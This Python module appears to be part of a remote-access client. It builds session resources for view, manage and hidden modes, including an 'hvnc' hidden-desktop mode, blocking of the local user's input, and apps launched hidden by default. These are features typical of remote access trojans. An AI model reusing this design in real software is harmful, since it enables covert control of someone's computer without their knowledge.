"""Session resource factory for remote connections."""
from __future__ import annotations

from typing import Any, Callable

import logging
import os

from remote_client.apps.launcher import launch_app
from remote_client.control.cursor_visibility import CursorVisibilityController
from remote_client.control.handlers import ControlHandler, StabilizedControlHandler
from remote_client.control.input_controller import InputController, NullInputController
from remote_client.media.audio import AudioTrack
from remote_client.media.screen import ScreenTrack
from remote_client.webrtc.client import SessionResources
from remote_client.windows.hidden_desktop import (
    HiddenDesktopSession,
    HiddenWindowSession,
    create_hidden_session,
)

logger = logging.getLogger(__name__)


def _normalize_mode(mode: str | None) -> str:
    if not mode:
        return "manage"
    value = str(mode).strip().lower()
    if value in {"view", "viewer", "readonly"}:
        return "view"
    if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
        return "hidden"
    # HVNC mode - forces true hidden desktop via CreateDesktop API
    if value in {"hvnc", "hiddenvnc", "createdesktop"}:
        return "hvnc"
    # Support new printwindow mode explicitly
    if value in {"printwindow", "print_window", "print-window", "pw"}:
        return "printwindow"
    return "manage"


def _input_stabilizer_enabled() -> bool:
    value = os.getenv("RC_INPUT_STABILIZER", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _audio_enabled() -> bool:
    value = os.getenv("RC_DISABLE_AUDIO", "")
    return value.strip().lower() not in {"1", "true", "yes", "on"}


def _launch_hidden_enabled() -> bool:
    value = os.getenv("RC_LAUNCH_HIDDEN", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _build_control_handler(controller: InputController) -> ControlHandler:
    if _input_stabilizer_enabled():
        return StabilizedControlHandler(controller)
    return ControlHandler(controller)


def _compose_close(
    primary: Callable[[], None] | None,
    cursor_controller: CursorVisibilityController | None,
) -> Callable[[], None] | None:
    if not primary and not cursor_controller:
        return None

    def _close() -> None:
        if cursor_controller:
            cursor_controller.reset()
        if primary:
            primary()

    return _close


def build_session_resources(mode: str | None) -> SessionResources:
    normalized = _normalize_mode(mode)
    cursor_controller = CursorVisibilityController()
    if normalized == "view":
        controller = NullInputController()
        screen_track = ScreenTrack()
        control_handler = ControlHandler(controller)
        media_tracks: list[Any] = [screen_track]
        if _audio_enabled():
            media_tracks.append(AudioTrack())

        def _set_stream_profile(
            profile: str | None,
            width: int | None,
            height: int | None,
            fps: int | None,
        ) -> None:
            for track in media_tracks:
                if hasattr(track, "set_profile"):
                    track.set_profile(profile, width, height, fps)

        return SessionResources(
            control_handler,
            media_tracks,
            close=_compose_close(None, cursor_controller),
            set_stream_profile=_set_stream_profile,
            set_cursor_visibility=cursor_controller.set_visible,
        )
    if normalized in {"hidden", "printwindow", "hvnc"}:
        # Determine which mode to use
        if normalized == "printwindow":
            session_mode = "printwindow"
        elif normalized == "hvnc":
            session_mode = "hvnc"
        else:
            # Check environment variable for preferred hidden mode
            env_mode = os.getenv("RC_HIDDEN_MODE", "auto").strip().lower()
            if env_mode in {"hvnc", "hiddenvnc", "createdesktop"}:
                session_mode = "hvnc"
            elif env_mode in {"printwindow", "pw"}:
                session_mode = "printwindow"
            elif env_mode in {"virtual_display", "vd", "driver"}:
                session_mode = "virtual_display"
            elif env_mode in {"fallback", "legacy"}:
                session_mode = "fallback"
            else:
                session_mode = "auto"  # auto now tries hvnc first
        
        try:
            hidden_session = create_hidden_session(mode=session_mode)
            logger.info("Hidden session started in %s mode", hidden_session.mode)
        except Exception as exc:
            logger.warning("Hidden desktop session unavailable: %s", exc)
        else:
            controller = hidden_session.input_controller
            control_handler = _build_control_handler(controller)
            media_tracks: list[Any] = [hidden_session.screen_track]
            if _audio_enabled():
                media_tracks.append(AudioTrack())

            def _hidden_launch_app(app_name: str) -> None:
                hidden_session.launch_application(app_name)

            def _set_stream_profile(
                profile: str | None,
                width: int | None,
                height: int | None,
                fps: int | None,
            ) -> None:
                hidden_session.screen_track.set_profile(profile, width, height, fps)
            
            # Input blocking support for hidden/hvnc modes
            def _set_input_blocking(enabled: bool) -> bool:
                if enabled:
                    return hidden_session.block_local_input()
                else:
                    hidden_session.unblock_local_input()
                    return True
            
            def _get_input_blocked() -> bool:
                return getattr(hidden_session, '_input_blocked', False)

            return SessionResources(
                control_handler,
                media_tracks,
                close=hidden_session.close,
                launch_app=_hidden_launch_app,
                set_stream_profile=_set_stream_profile,
                set_input_blocking=_set_input_blocking,
                get_input_blocked=_get_input_blocked,
            )

    controller = InputController()
    screen_track = ScreenTrack(draw_cursor=False)
    control_handler = _build_control_handler(controller)
    media_tracks: list[Any] = [screen_track]
    if _audio_enabled():
        media_tracks.append(AudioTrack())

    def _launch_app(app_name: str) -> None:
        launch_app(app_name, hidden=_launch_hidden_enabled())

    def _set_stream_profile(
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        for track in media_tracks:
            if hasattr(track, "set_profile"):
                track.set_profile(profile, width, height, fps)

    return SessionResources(
        control_handler,
        media_tracks,
        close=_compose_close(None, cursor_controller),
        launch_app=_launch_app,
        set_stream_profile=_set_stream_profile,
        set_cursor_visibility=cursor_controller.set_visible,
    )
